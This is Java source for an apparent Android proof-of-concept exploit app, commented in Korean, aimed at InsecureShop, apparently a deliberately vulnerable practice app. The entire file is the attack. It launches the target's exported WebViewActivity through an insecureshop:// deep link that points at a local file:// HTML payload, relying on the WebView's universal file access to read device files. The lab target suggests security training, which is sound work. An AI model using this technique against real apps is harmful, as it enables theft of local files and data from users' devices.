package com.insecureshopapp.myapplication;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

import java.io.File;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "ExploitMainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            // ex.html 경로 (이미 Download 폴더에 있다고 가정)
            File exHtmlFile = new File("/sdcard/Download/ex.html");

            if (!exHtmlFile.exists()) {
                Log.e(TAG, "ex.html 파일이 존재하지 않습니다: " + exHtmlFile.getAbsolutePath());
                return;
            }

            // com.insecureshop.WebViewActivity 호출 인텐트 생성
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setClassName("com.insecureshop", "com.insecureshop.WebViewActivity");

            // file:// 스킴으로 ex.html 파일 URI 설정
            Uri fileUri = Uri.parse("file://" + exHtmlFile.getAbsolutePath());
            // 인텐트 데이터에 URI를 설정. (insecureshop 스키마 기반이면 아래와 같이도 가능)
            intent.setData(Uri.parse("insecureshop://com.insecureshop/web?url=" + fileUri.toString()));

            // 웹뷰에서 universal access 허용되어 있으므로 파일을 읽고 공격 가능
            startActivity(intent);

            Log.d(TAG, "Exploit intent started: " + intent.getDataString());
        } catch (Exception e) {
            Log.e(TAG, "예외 발생", e);
        }
    }
}
